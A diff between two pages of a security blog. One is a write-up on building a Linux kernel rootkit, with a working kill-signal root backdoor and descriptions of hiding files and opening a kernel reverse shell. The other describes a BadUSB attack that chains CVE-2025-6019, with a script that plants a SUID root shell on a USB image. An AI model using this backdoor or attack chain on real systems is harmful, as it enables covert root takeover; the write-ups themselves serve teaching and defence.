@@ -15,20 +15,20 @@
 
   
   
-    <title>Ring 0 Operations: Building a Linux Rootkit from Scratch &middot; Malware Kindergarten</title>
-    <meta name="title" content="Ring 0 Operations: Building a Linux Rootkit from Scratch &middot; Malware Kindergarten">
+    <title>Deep Dive: HID Attacks with Raspberry Pi Pico and CVE-2025-6019 &middot; Malware Kindergarten</title>
+    <meta name="title" content="Deep Dive: HID Attacks with Raspberry Pi Pico and CVE-2025-6019 &middot; Malware Kindergarten">
   
 
   
   
-    <meta name="description" content="A deep dive into kernel space programming, syscall hooking with Ftrace, and the art of hiding processes and files in Linux.">
+    <meta name="description" content="Combining a Raspberry Pi Pico BadUSB with a Linux privilege escalation vulnerability to achieve root access via physical USB insertion.">
   
   
-    <meta name="keywords" content="C,Linux Kernel,Rootkit,Malware Dev,Low Level,">
+    <meta name="keywords" content="C,CVE,Attack,Linux,">
   
   
   
-  <link rel="canonical" href="https://JustThinkingHard.github.io/posts/rootkit/">
+  <link rel="canonical" href="https://JustThinkingHard.github.io/posts/hid-attack/">
   
 
   
@@ -38,25 +38,24 @@
   
 
   
-  <meta property="og:url" content="https://JustThinkingHard.github.io/posts/rootkit/">
+  <meta property="og:url" content="https://JustThinkingHard.github.io/posts/hid-attack/">
   <meta property="og:site_name" content="Malware Kindergarten">
-  <meta property="og:title" content="Ring 0 Operations: Building a Linux Rootkit from Scratch">
-  <meta property="og:description" content="A deep dive into kernel space programming, syscall hooking with Ftrace, and the art of hiding processes and files in Linux.">
+  <meta property="og:title" content="Deep Dive: HID Attacks with Raspberry Pi Pico and CVE-2025-6019">
+  <meta property="og:description" content="Combining a Raspberry Pi Pico BadUSB with a Linux privilege escalation vulnerability to achieve root access via physical USB insertion.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-01-26T00:00:00+00:00">
-    <meta property="article:modified_time" content="2026-01-26T00:00:00+00:00">
+    <meta property="article:published_time" content="2026-01-20T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-20T00:00:00+00:00">
     <meta property="article:tag" content="C">
-    <meta property="article:tag" content="Linux Kernel">
-    <meta property="article:tag" content="Rootkit">
-    <meta property="article:tag" content="Malware Dev">
-    <meta property="article:tag" content="Low Level">
+    <meta property="article:tag" content="CVE">
+    <meta property="article:tag" content="Attack">
+    <meta property="article:tag" content="Linux">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Ring 0 Operations: Building a Linux Rootkit from Scratch">
-  <meta name="twitter:description" content="A deep dive into kernel space programming, syscall hooking with Ftrace, and the art of hiding processes and files in Linux.">
+  <meta name="twitter:title" content="Deep Dive: HID Attacks with Raspberry Pi Pico and CVE-2025-6019">
+  <meta name="twitter:description" content="Combining a Raspberry Pi Pico BadUSB with a Linux privilege escalation vulnerability to achieve root access via physical USB insertion.">
 
   
   
@@ -206,25 +205,25 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Ring 0 Operations: Building a Linux Rootkit from Scratch",
-    "headline": "Ring 0 Operations: Building a Linux Rootkit from Scratch",
-    "description": "A deep dive into kernel space programming, syscall hooking with Ftrace, and the art of hiding processes and files in Linux.",
+    "name": "Deep Dive: HID Attacks with Raspberry Pi Pico and CVE-2025-6019",
+    "headline": "Deep Dive: HID Attacks with Raspberry Pi Pico and CVE-2025-6019",
+    "description": "Combining a Raspberry Pi Pico BadUSB with a Linux privilege escalation vulnerability to achieve root access via physical USB insertion.",
     "inLanguage": "en",
-    "url" : "https://JustThinkingHard.github.io/posts/rootkit/",
+    "url" : "https://JustThinkingHard.github.io/posts/hid-attack/",
     "author" : {
       "@type": "Person",
       "name": "JustThinkingHard"
     },
     "copyrightYear": "2026",
-    "dateCreated": "2026-01-26T00:00:00\u002b00:00",
-    "datePublished": "2026-01-26T00:00:00\u002b00:00",
+    "dateCreated": "2026-01-20T00:00:00\u002b00:00",
+    "datePublished": "2026-01-20T00:00:00\u002b00:00",
     
-    "dateModified": "2026-01-26T00:00:00\u002b00:00",
+    "dateModified": "2026-01-20T00:00:00\u002b00:00",
     
-    "keywords": ["C","Linux Kernel","Rootkit","Malware Dev","Low Level"],
+    "keywords": ["C","CVE","Attack","Linux"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "819"
+    "wordCount": "777"
   }]
   </script>
 
@@ -547,7 +546,7 @@
     <header id="single_header" class="mt-5 max-w-prose">
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        Ring 0 Operations: Building a Linux Rootkit from Scratch
+        Deep Dive: HID Attacks with Raspberry Pi Pico and CVE-2025-6019
       </h1>
       <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -599,7 +598,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2026-01-26T00:00:00&#43;00:00">26 January 2026</time><span class="px-2 text-primary-500">&middot;</span><span>819 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+      <time datetime="2026-01-20T00:00:00&#43;00:00">20 January 2026</time><span class="px-2 text-primary-500">&middot;</span><span>777 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
     
 
     
@@ -703,18 +702,20 @@
     class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#the-objective">The Objective</a></li>
-    <li><a href="#the-core-mechanism-syscall-hooking">The Core Mechanism: Syscall Hooking</a>
+    <li>
       <ul>
-        <li><a href="#the-challenge-control-register-0-cr0">The Challenge: Control Register 0 (CR0)</a></li>
-        <li><a href="#the-ftrace-solution">The Ftrace Solution</a></li>
+        <li><a href="#the-concept-beyond-the-rubber-ducky">The Concept: Beyond the Rubber Ducky</a></li>
+        <li><a href="#the-vulnerability-cve-2025-6019">The Vulnerability: CVE-2025-6019</a></li>
+        <li><a href="#the-attack-chain">The Attack Chain</a>
+          <ul>
+            <li><a href="#1-the-trojan-horse-mass-storage">1. The Trojan Horse (Mass Storage)</a></li>
+            <li><a href="#2-the-trigger-hid-keyboard">2. The Trigger (HID Keyboard)</a></li>
+          </ul>
+        </li>
+        <li><a href="#automation-and-quality-of-life">Automation and &ldquo;Quality of Life&rdquo;</a></li>
+        <li><a href="#conclusion--mitigation">Conclusion &amp; Mitigation</a></li>
       </ul>
     </li>
-    <li><a href="#feature-1-the-art-of-invisibility-hiding-files">Feature 1: The Art of Invisibility (Hiding Files)</a></li>
-    <li><a href="#feature-2-the-magic-backdoor-privilege-escalation">Feature 2: The Magic Backdoor (Privilege Escalation)</a></li>
-    <li><a href="#feature-3-secret-connections">Feature 3: Secret Connections</a></li>
-    <li><a href="#challenges-and-kernel-panics">Challenges and Kernel Panics</a></li>
-    <li><a href="#conclusion">Conclusion</a></li>
   </ul>
 </nav>
   </div>
@@ -728,18 +729,20 @@
     class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#the-objective">The Objective</a></li>
-    <li><a href="#the-core-mechanism-syscall-hooking">The Core Mechanism: Syscall Hooking</a>
+    <li>
       <ul>
-        <li><a href="#the-challenge-control-register-0-cr0">The Challenge: Control Register 0 (CR0)</a></li>
-        <li><a href="#the-ftrace-solution">The Ftrace Solution</a></li>
+        <li><a href="#the-concept-beyond-the-rubber-ducky">The Concept: Beyond the Rubber Ducky</a></li>
+        <li><a href="#the-vulnerability-cve-2025-6019">The Vulnerability: CVE-2025-6019</a></li>
+        <li><a href="#the-attack-chain">The Attack Chain</a>
+          <ul>
+            <li><a href="#1-the-trojan-horse-mass-storage">1. The Trojan Horse (Mass Storage)</a></li>
+            <li><a href="#2-the-trigger-hid-keyboard">2. The Trigger (HID Keyboard)</a></li>
+          </ul>
+        </li>
+        <li><a href="#automation-and-quality-of-life">Automation and &ldquo;Quality of Life&rdquo;</a></li>
+        <li><a href="#conclusion--mitigation">Conclusion &amp; Mitigation</a></li>
       </ul>
     </li>
-    <li><a href="#feature-1-the-art-of-invisibility-hiding-files">Feature 1: The Art of Invisibility (Hiding Files)</a></li>
-    <li><a href="#feature-2-the-magic-backdoor-privilege-escalation">Feature 2: The Magic Backdoor (Privilege Escalation)</a></li>
-    <li><a href="#feature-3-secret-connections">Feature 3: Secret Connections</a></li>
-    <li><a href="#challenges-and-kernel-panics">Challenges and Kernel Panics</a></li>
-    <li><a href="#conclusion">Conclusion</a></li>
   </ul>
 </nav>
   </div>
@@ -756,148 +759,127 @@
         
 
         <div class="article-content max-w-prose mb-20">
-          <p>In the world of cybersecurity, there is a distinct line between &ldquo;User Space&rdquo; (Ring 3) and &ldquo;Kernel Space&rdquo; (Ring 0). User space is where your browser, text editor, and shell live. It is safe, restricted, and monitored. Kernel space is the Wild West. It is where the hardware is controlled, where memory is managed, and crucially where the rules of reality for the operating system are defined.</p>
-<p>For my latest project, I decided to cross that line. I developed a <strong>Linux Rootkit</strong> as a Loadable Kernel Module (LKM).</p>
-<blockquote><p><strong>Disclaimer:</strong> This project was developed strictly for educational purposes to understand OS internals and malware behavior. The techniques discussed here should never be used on systems without explicit authorization.</p>
-</blockquote>
-<h2 class="relative group">The Objective
-    <div id="the-objective" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-objective" aria-label="Anchor">#</a>
-    </span>
-    
-</h2>
-<p>The goal was to create a stealthy kernel module capable of:</p>
-<ol>
-<li><strong>Hiding itself</strong> from the list of loaded modules.</li>
-<li><strong>Hiding files</strong> and directories from standard tools like <code>ls</code>.</li>
-<li><strong>Hiding processes</strong> from tools like <code>ps</code> or <code>top</code>.</li>
-<li><strong>Providing a Backdoor</strong> for instant root privilege escalation.</li>
-<li><strong>Establishing covert communication</strong> channels.</li>
-</ol>
+          <p>There is an old adage in cybersecurity: <em>&ldquo;If a bad guy has unrestricted physical access to your computer, it&rsquo;s not your computer anymore.&rdquo;</em></p>
+<p>Often, people assume this means taking apart the laptop to dump memory or soldering wires to the motherboard. But sometimes, it’s as simple as plugging in a USB drive for ten seconds while the target gets a coffee.</p>
+<p>In this project, I wanted to explore the modern state of <strong>HID (Human Interface Device) Attacks</strong>. I combined low-cost hardware (a Raspberry Pi Pico acting as a &ldquo;BadUSB&rdquo;) with a very recent Linux vulnerability, <strong>CVE-2025-6019</strong>, to create a &ldquo;Plug-and-Pwn&rdquo; device that elevates from physical access to a root shell almost instantly.</p>
 
-<h2 class="relative group">The Core Mechanism: Syscall Hooking
-    <div id="the-core-mechanism-syscall-hooking" class="anchor"></div>
+<h3 class="relative group">The Concept: Beyond the Rubber Ducky
+    <div id="the-concept-beyond-the-rubber-ducky" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-core-mechanism-syscall-hooking" aria-label="Anchor">#</a>
-    </span>
-    
-</h2>
-<p>The Linux kernel interacts with user space programs via <strong>System Calls</strong> (syscalls). When you run <code>ls</code>, the program doesn&rsquo;t actually look at the disk; it asks the kernel to do it via the <code>sys_getdents64</code> syscall. When you run <code>kill</code>, it calls <code>sys_kill</code>.</p>
-<p>To control the system, we don&rsquo;t need to replace the tools; we just need to intercept these phone calls.</p>
-
-<h3 class="relative group">The Challenge: Control Register 0 (CR0)
-    <div id="the-challenge-control-register-0-cr0" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-challenge-control-register-0-cr0" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-concept-beyond-the-rubber-ducky" aria-label="Anchor">#</a>
     </span>
     
 </h3>
-<p>In older versions of Linux, you could simply overwrite the <code>sys_call_table</code>. However, modern kernels have the <strong>Write Protect (WP)</strong> bit set in the CR0 register, preventing modification of the syscall table.</p>
-<p>While it is possible to disable this bit, a cleaner and more modern approach (and the one I utilized) involves using <strong>Ftrace</strong> (Function Tracer).</p>
+<p>Classic HID attacks (like the famous USB Rubber Ducky) usually work by emulating a keyboard and typing furiously. They open a terminal, type a long <code>wget</code> command to download a payload, and run it.</p>
+<p>This works, but it has drawbacks:</p>
+<ol>
+<li><strong>It&rsquo;s noisy:</strong> A terminal window flashing on the screen is obvious to the user.</li>
+<li><strong>It requires internet:</strong> The target needs to reach your C2 server to download the stage 2 payload.</li>
+</ol>
+<p>I wanted something cleaner, faster, and more self-contained. My goal was a device that acts as both a keyboard <em>and</em> mass storage simultaneously to deliver the exploit locally.</p>
 
-<h3 class="relative group">The Ftrace Solution
-    <div id="the-ftrace-solution" class="anchor"></div>
+<h3 class="relative group">The Vulnerability: CVE-2025-6019
+    <div id="the-vulnerability-cve-2025-6019" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-ftrace-solution" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-vulnerability-cve-2025-6019" aria-label="Anchor">#</a>
     </span>
     
 </h3>
-<p>Ftrace is a debugging framework built into the kernel. It allows us to attach a callback to almost any function in the kernel. We can modify the instruction pointer (RIP) of a specific syscall to point to <em>our</em> malicious function instead of the real one.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Simplified Hooking Logic
-</span></span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="n">hooks</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;sys_getdents64&#34;</span><span class="p">,</span> <span class="n">hook_getdents64</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_getdents64</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;sys_kill&#34;</span><span class="p">,</span> <span class="n">hook_kill</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_kill</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></div></div>
+<p>The core of this attack isn&rsquo;t just typing fast; it&rsquo;s weaponizing a specific flaw in how modern Linux desktop environments handle removable media.</p>
+<p>CVE-2025-6019 relates to a local privilege escalation vulnerability involving <code>libblockdev</code> and <code>udisks2</code>. In simple terms, modern desktops try to be helpful. When a user is physically present at the machine, services like PolicyKit often allow them to mount USB drives without asking for a root password (via the <code>allow_active</code> directive).</p>
+<p>The critical flaw is that under certain conditions, the system fails to enforce security restrictions like <code>nosuid</code> (No Set User ID) on these user-mounted partitions.</p>
+<p>If I can mount a partition containing a binary with the <strong>SUID bit set</strong> owned by root, and the system doesn&rsquo;t strip that bit during mounting, executing that binary gives me root privileges.</p>
 
-<h2 class="relative group">Feature 1: The Art of Invisibility (Hiding Files)
-    <div id="feature-1-the-art-of-invisibility-hiding-files" class="anchor"></div>
+<h3 class="relative group">The Attack Chain
+    <div id="the-attack-chain" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#feature-1-the-art-of-invisibility-hiding-files" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-attack-chain" aria-label="Anchor">#</a>
     </span>
     
-</h2>
-<p>How do you hide a file named <code>malware_data</code>? You hook <code>sys_getdents64</code>.</p>
-<p>This syscall is responsible for listing the contents of a directory. It fills a buffer with <code>linux_dirent64</code> structures. My hook works like a Man-in-the-Middle:</p>
-<ol>
-<li><strong>Intercept:</strong> The user asks for a directory listing.</li>
-<li><strong>Call Original:</strong> We call the <em>real</em> <code>sys_getdents64</code> to get the actual data.</li>
-<li><strong>Filter:</strong> We iterate through the returned buffer in memory. If we find a filename containing our magic prefix (e.g., <code>hidden_</code>), we memmove the rest of the buffer over it, effectively erasing it from existence.</li>
-<li><strong>Return:</strong> We give the filtered buffer to the user.</li>
-</ol>
-<p>To the user—and to the <code>ls</code> command—the file simply does not exist.</p>
+</h3>
+<p>My implementation uses a microcontroller (like a Pi Pico or an Arduino-compatible board) programmed to present itself as two devices: Let&rsquo;s call it the <strong>&ldquo;Two-Faced USB&rdquo;</strong>.</p>
 
-<h2 class="relative group">Feature 2: The Magic Backdoor (Privilege Escalation)
-    <div id="feature-2-the-magic-backdoor-privilege-escalation" class="anchor"></div>
+<h4 class="relative group">1. The Trojan Horse (Mass Storage)
+    <div id="1-the-trojan-horse-mass-storage" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#feature-2-the-magic-backdoor-privilege-escalation" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#1-the-trojan-horse-mass-storage" aria-label="Anchor">#</a>
     </span>
     
-</h2>
-<p>A rootkit isn&rsquo;t useful if you don&rsquo;t have root access. To achieve persistence, I implemented a hook on the <code>sys_kill</code> syscall.</p>
-<p>Normally, <code>kill</code> is used to send signals to processes. I modified it to listen for a specific, unused signal (e.g., Signal 64).</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">asmlinkage</span> <span class="kt">int</span> <span class="nf">hook_kill</span><span class="p">(</span><span class="kt">pid_t</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sig</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">sig</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="c1">// The Magic Phrase was spoken!
-</span></span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">new_creds</span> <span class="o">=</span> <span class="nf">prepare_kernel_cred</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span> <span class="c1">// Create root creds
-</span></span></span><span class="line"><span class="cl">        <span class="nf">commit_creds</span><span class="p">(</span><span class="n">new_creds</span><span class="p">);</span> <span class="c1">// Apply to current process
-</span></span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">orig_kill</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">sig</span><span class="p">);</span> <span class="c1">// Otherwise, act normal
-</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
-<p>Now, any user on the system can simply type <code>kill -64 1</code> in the terminal. Instead of sending a signal, the kernel grants that user&rsquo;s shell <code>uid=0</code> (Root) instantly. No passwords, no sudo logs.</p>
+</h4>
+<p>One part of the USB device acts as a standard storage drive. Before the attack, I prepare a specially crafted, tiny filesystem image on it.</p>
+<p>The preparation script (<code>C2-attack.sh</code> in my repo) does the heavy lifting:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a small container file</span>
+</span></span><span class="line"><span class="cl">dd <span class="k">if</span><span class="o">=</span>/dev/zero <span class="nv">of</span><span class="o">=</span>./payload.img <span class="nv">bs</span><span class="o">=</span>1M <span class="nv">count</span><span class="o">=</span><span class="m">50</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Format it as XFS (or ext4)</span>
+</span></span><span class="line"><span class="cl">mkfs.xfs ./payload.img
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Mount it temporarily to inject the payload</span>
+</span></span><span class="line"><span class="cl">mkdir -p ./mnt_point
+</span></span><span class="line"><span class="cl">mount -o loop ./payload.img ./mnt_point
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Copy a shell binary (like bash or sh)</span>
+</span></span><span class="line"><span class="cl">cp /bin/bash ./mnt_point/sys_shell
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># THE CRITICAL STEP: Set the SUID bit</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 4755 means root owner, readable/executable by all, </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># but runs with the permissions of the owner (root)</span>
+</span></span><span class="line"><span class="cl">chown root:root ./mnt_point/sys_shell
+</span></span><span class="line"><span class="cl">chmod <span class="m">4755</span> ./mnt_point/sys_shell
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Unmount. The image is now primed.</span>
+</span></span><span class="line"><span class="cl">umount ./mnt_point</span></span></code></pre></div></div>
+<p>This image now contains a &ldquo;poisoned&rdquo; bash shell.</p>
 
-<h2 class="relative group">Feature 3: Secret Connections
-    <div id="feature-3-secret-connections" class="anchor"></div>
+<h4 class="relative group">2. The Trigger (HID Keyboard)
+    <div id="2-the-trigger-hid-keyboard" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#feature-3-secret-connections" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#2-the-trigger-hid-keyboard" aria-label="Anchor">#</a>
     </span>
     
-</h2>
-<p>The project also involved opening sockets directly from kernel space. This bypasses standard user-space firewalls that might be monitoring specific binaries. By utilizing <code>kernel_sock_shutdown</code> and <code>call_usermodehelper</code>, the rootkit can initiate a reverse shell to a remote listener, removing the process from user-space visibility. However, with the correct command, users can still see the connection to the remote server, but not the process itself.</p>
+</h4>
+<p>When the USB is plugged in, the OS detects the storage partition. The HID keyboard component then immediately sends a pre-programmed sequence of keystrokes.</p>
+<p>Instead of typing a long download command, it simply triggers the mounting of the poisoned partition. Because of CVE-2025-6019, the desktop environment mounts it <em>without</em> <code>nosuid</code>.</p>
+<p>The keyboard then navigates to the mount point and executes the poisoned shell:</p>
+<p><code>$ /media/user/USB_NAME/sys_shell -p</code></p>
+<p>Because the SUID bit is active, this shell spawns with effective UID 0 (root). Game over.</p>
 
-<h2 class="relative group">Challenges and Kernel Panics
-    <div id="challenges-and-kernel-panics" class="anchor"></div>
+<h3 class="relative group">Automation and &ldquo;Quality of Life&rdquo;
+    <div id="automation-and-quality-of-life" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#challenges-and-kernel-panics" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#automation-and-quality-of-life" aria-label="Anchor">#</a>
     </span>
     
-</h2>
-<p>Developing in Ring 0 is unforgiving. In C++, if you make a memory error, you get a &ldquo;Segmentation Fault&rdquo; and the program crashes. In Kernel C, if you dereference a null pointer or mess up a list pointer, the <strong>entire operating system crashes</strong> (Kernel Panic).</p>
-<p>Debugging involved setting up QEMU virtualization and analyzing crash dumps to ensure the hooks were stable and thread-safe.</p>
+</h3>
+<p>To make this a viable Red Team tool, I automated the payload generation. I wrote Python scripts that detect the attacker&rsquo;s local IP and embed it into the necessary files before generating the final image.</p>
+<p>This ensures that once root is achieved on the victim machine, it knows exactly where to send the reverse shell back to the attacker, making the attack highly portable.</p>
 
-<h2 class="relative group">Conclusion
-    <div id="conclusion" class="anchor"></div>
+<h3 class="relative group">Conclusion &amp; Mitigation
+    <div id="conclusion--mitigation" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#conclusion" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#conclusion--mitigation" aria-label="Anchor">#</a>
     </span>
     
-</h2>
-<p>This project was a fascinating journey into the depths of the Linux Operating System. It required a solid understanding of:</p>
-<ul>
-<li><strong>C Programming</strong> (Memory management, pointers, structs).</li>
-<li><strong>Assembly</strong> (Understanding registers and calling conventions).</li>
-<li><strong>Operating System Architecture</strong> (VFS, Process Scheduling, Interrupts).</li>
-</ul>
-<p>By building the weapon, I learned exactly how to defend against it. Understanding how LKMs can be manipulated is crucial for forensic analysis and hardening Linux systems against advanced persistent threats.</p>
+</h3>
+<p>This project was a fascinating dive into the intersection of hardware and software security. It highlights that even if your network perimeter is flawless, a ten-dollar USB stick and a localized OS vulnerability can bypass everything.</p>
+<p><strong>How to defend against this?</strong>
+For system administrators, the mitigation involves hardening PolicyKit rules to ensure physical users cannot mount arbitrary filesystems without strict <code>nosuid</code> and <code>noexec</code> options enforced by the kernel.</p>
+<p>For everyone else: Don&rsquo;t plug strange USB drives into your computer. Seriously.</p>
+<p><em>You can find the proof-of-concept code for this project on the <a href="https://github.com/JustThinkingHard/HID-Attack"  target="_blank" rel="noreferrer">repository</a>.</em></p>
 
           
           
@@ -925,8 +907,8 @@
           type="text/javascript"
           src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
           integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
-          data-oid="views_posts/rootkit.md"
-          data-oid-likes="likes_posts/rootkit.md"></script>
+          data-oid="views_posts/HID-attack.md"
+          data-oid-likes="likes_posts/HID-attack.md"></script>
       
     </section>
 
@@ -944,19 +926,32 @@
           
             <a
               class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
-              href="/posts/hid-attack/">
+              href="/posts/process_injector/">
               <span class="leading-6">
-                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Deep Dive: HID Attacks with Raspberry Pi Pico and CVE-2025-6019
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Deep Dive: Process Injection via Code Cave Discovery on Linux
               </span>
             </a>
             
               <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
-                <time datetime="2026-01-20T00:00:00&#43;00:00">20 January 2026</time>
+                <time datetime="2026-01-18T00:00:00&#43;00:00">18 January 2026</time>
               </span>
             
           
         </span>
         <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/posts/rootkit/">
+              <span class="leading-6">
+                Ring 0 Operations: Building a Linux Rootkit from Scratch&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2026-01-26T00:00:00&#43;00:00">26 January 2026</time>
+              </span>
+            
           
         </span>
       </div>
